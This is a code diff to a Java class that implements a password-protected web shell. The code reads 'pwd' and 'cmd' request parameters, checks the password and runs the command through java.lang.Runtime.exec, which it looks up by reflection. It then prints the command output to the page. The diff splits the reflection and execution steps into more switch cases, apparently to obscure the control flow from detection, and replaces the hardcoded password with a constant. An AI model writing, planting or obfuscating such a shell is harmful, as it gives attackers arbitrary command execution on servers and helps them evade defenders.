@@ -6,7 +6,7 @@ public class base {
 
     public static void main(String[] args) {
         try {
-            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9","pwd","cmd","java.lang.Runtime",
+            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11","pwd","cmd","java.lang.Runtime",
                     "getRuntime","exec","<pre>","</pre>"};
             String temp = globalArr[0];
             String[] b = temp.split("\\|");
@@ -14,8 +14,8 @@ public class base {
             String passwd = null;
             String cmd = null;
             Class rt = null;
-            Method gr = null;
-            Method ex = null;
+            java.lang.reflect.Method gr = null;
+            java.lang.reflect.Method ex = null;
             Process process = null;
             java.io.InputStream in = null;
             byte bytes[] = null;
@@ -29,32 +29,36 @@ public class base {
                         cmd = request.getParameter(globalArr[2]);
                         break;
                     case 2:
-                        if (!passwd.equals("4ra1n")) {
+                        if (!passwd.equals(PASSWORD)) {
                             return;
                         }
                     case 3:
                         rt =  Class.forName(globalArr[3]);
-                        gr = rt.getMethod(globalArr[4]);
-                        ex = rt.getMethod(globalArr[5], String.class);
                         break;
                     case 4:
-                        process = (Process) ex.invoke(gr.invoke(null),  cmd);
+                        gr = rt.getMethod(globalArr[4]);
                         break;
                     case 5:
-                        in = process.getInputStream();
+                        ex = rt.getMethod(globalArr[5], String.class);
                         break;
                     case 6:
-                        bytes = new byte[2048];
+                        process = (Process) ex.invoke(gr.invoke(null),  cmd);
                         break;
                     case 7:
-                        out.print(globalArr[6]);
+                        in = process.getInputStream();
                         break;
                     case 8:
+                        bytes = new byte[2048];
+                        break;
+                    case 9:
+                        out.print(globalArr[6]);
+                        break;
+                    case 10:
                         while ((in.read(bytes)) != -1) {
                             out.println(new String(bytes));
                         }
                         break;
-                    case 9:
+                    case 11:
                         out.print(globalArr[7]);
                 }
             }
